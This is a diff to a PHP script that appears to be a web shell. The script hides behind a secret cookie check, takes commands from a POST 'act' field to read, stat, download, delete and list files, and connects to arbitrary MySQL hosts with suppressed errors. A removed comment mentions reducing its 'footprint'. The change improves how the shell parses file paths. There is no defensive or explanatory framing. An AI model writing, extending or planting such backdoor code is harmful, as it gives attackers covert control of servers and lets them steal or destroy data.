@@ -9,15 +9,21 @@ if (!isset($_COOKIE[$cookie_name]) || $_COOKIE[$cookie_name] !== $secret_value) 
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['act'])) {
-    $p = explode(' ', trim($_POST['act']));
-    $action = $p[0]; 
-    $target = isset($p[1]) ? $p[1] : '.';
-    $arg1 = isset($p[2]) ? $p[2] : ''; 
-    $arg2 = isset($p[3]) ? $p[3] : ''; 
-    $arg3 = isset($p[4]) ? $p[4] : '';
+    $raw_act = trim($_POST['act']);
+    $p = explode(' ', $raw_act);
+    $action = $p[0];
+    $file_cmds = array('read', 'stat', 'download', 'delete', 'dir');
+    
+    if (in_array($action, $file_cmds)) {
+        $target = (count($p) > 1) ? implode(' ', array_slice($p, 1)) : '.';
+        $arg1 = $arg2 = $arg3 = ''; 
+    } else {
+        $target = isset($p[1]) ? $p[1] : '.';
+        $arg1 = isset($p[2]) ? $p[2] : ''; 
+        $arg2 = isset($p[3]) ? $p[3] : ''; 
+        $arg3 = isset($p[4]) ? $p[4] : '';
+    }
     $out = "";
-
-    // Helper for DB actions to reduce footprint
     $dbInit = function($dbn = '') use ($target, $arg1, $arg2) {
         $hp = explode(':', $target);
         return @new mysqli($hp[0], $arg1, $arg2, $dbn, isset($hp[1]) ? (int)$hp[1] : 3306);
